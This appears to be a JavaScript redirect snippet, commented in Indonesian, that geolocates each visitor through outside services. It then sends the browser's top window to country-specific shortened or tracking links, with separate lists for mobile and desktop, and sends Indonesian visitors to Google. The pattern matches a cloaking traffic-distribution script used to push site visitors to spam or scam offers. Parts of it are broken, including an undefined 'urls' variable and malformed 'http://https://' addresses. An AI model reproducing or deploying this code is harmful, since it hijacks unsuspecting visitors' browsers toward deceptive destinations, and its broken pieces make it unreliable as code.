<script src='http://www.geoplugin.net/javascript.gp' type='text/javascript'></script>
    <script type='text/javascript'>
        //OFFER WAP
        if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/iPhone/i) ||
            navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) ||
            navigator.userAgent.match(/Windows Phone/i) || navigator.userAgent.match(/iPad/i)) {
            var target = []; // Bisa ditambah kode negara sesuai kebutuhan.
            target.AU = "https://tinyurl.com/y3mq8r2y/"; // AUTRALIA
            target.AT = "https://tinyurl.com/y3d8ffq9/"; // AUSTRIA
            target.FI = "https://2track.info/tDjY"; // FINLANDIA
            target.BE = "https://tinyurl.com/y4ncbevq/"; // BELGIUM
            target.NL = "http://2track.info/tDjY"; // NETHERLAND
            target.CH = "https://tinyurl.com/y4ncbevq/"; // SWITZERLAND
            target.DE = "https://tinyurl.com/yxqea4ob/"; // GERMANYSSSSSS
            target.DK = "http://2track.info/tDjY"; // DENMARK
            target.GB = "http://tinyurl.com/y3mq8r2y/"; // UNITED KINGDOM
            target.FR = "https://tinyurl.com/y4ncbevq/"; // FRANCE
            target.SE = "http://2track.info/tDjY/"; // SWEDEN
            target.NO = "http://2track.info/tDjY/"; // NORWAY
            target.NZ = "https://tinyurl.com/y3mq8r2y/"; // NEW ZEALAND
            target.US = "http://tinyurl.com/y3mq8r2y/"; // UNITED STATES
            target.CA = "https://tinyurl.com/y3mq8r2y/"; // CANADA
            target.IT = "http://tinyurl.com/y3bksz72/"; // ITALIASSSS
            target.ZA = "http://https://tinyurl.com/y3mq8r2y/"; // SOUTH AFRICA
            target.ID = "http://www.google.com"; // INDONESIA
            target.All = "http://2track.info/tDjY"; // INTERNATIONAL /
            setTimeout("document.location = urls;", 1500);
        }
        //OFFER WEB
        else {
            var target = []; // Bisa ditambah kode negara sesuai kebutuhan.
            target.AU = "https://tinyurl.com/y3mq8r2y/"; // AUTRALIA
            target.AT = "https://tinyurl.com/y3d8ffq9"; // AUSTRIASSSSSS
            target.FI = "http://2track.info/tDjY/"; // FINLANDIA
            target.BE = "https://tinyurl.com/y6mhxt87/"; // BELGIUM
            target.NL = "http:/https://2track.info/tDjY"; // NETHERLAND
            target.CH = "https://tinyurl.com/y6mhxt87/"; // SWITZERLAND
            target.DE = "https://tinyurl.com/yxqea4ob/"; // GERMANY
            target.DK = "http://2track.info/tDjY/"; // DENMARK
            target.GB = "https://tinyurl.com/y3mq8r2y/"; // UNITED KINGDOM
            target.FR = "https://tinyurl.com/y6mhxt87/"; // FRANCE
            target.SE = "http://2track.info/tDjY/"; // SWEDEN
            target.NO = "http://2track.info/tDjY/"; // NORWAY
            target.NZ = "https://tinyurl.com/y3mq8r2y/"; // NEW ZEALAND
            target.IT = "http://https://tinyurl.com/y3bksz72/"; // ITALIA
            target.US = "https://tinyurl.com/y3mq8r2y/"; // UNITED STATES
            target.CA = "https://tinyurl.com/y3mq8r2y/"; // CANADA
            target.ZA = "http://https://tinyurl.com/y3mq8r2y/"; // SOUTH AFRICA
            target.ID = "http://www.google.com"; // INDONESIA
            target.All = "http://2track.info/tDjY"; // INTERNATIONAL /
            setTimeout("document.location = urls;", 1500);
        }



        function geoip(g) {
                window.top.location.href = target[g.country_code] || target.All
            }
            (function(g, e, o, i, p) {
                i = g.createElement(e), p = g.getElementsByTagName(e)[0];
                i.async = 0;
                i.src = o;
                p.parentNode.insertBefore(i, p)
            })(document, 'script', 'https://freegeoip.net/json/?callback=geoip');
    </script>